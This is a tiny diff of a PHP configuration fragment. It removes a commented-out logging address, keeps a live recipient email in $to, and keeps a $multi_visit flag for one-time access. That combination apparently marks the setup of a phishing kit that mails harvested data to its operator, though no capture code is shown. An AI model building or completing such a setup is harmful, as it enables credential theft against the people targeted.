@@ -1,5 +1,4 @@
 <?php
-//$to  = 'logs@serviceintdsc.com';
 $to  = 'barzini.d@yandex.com';
 //To allow access only once change use $multi_visit = 1;
 $multi_visit = 0;
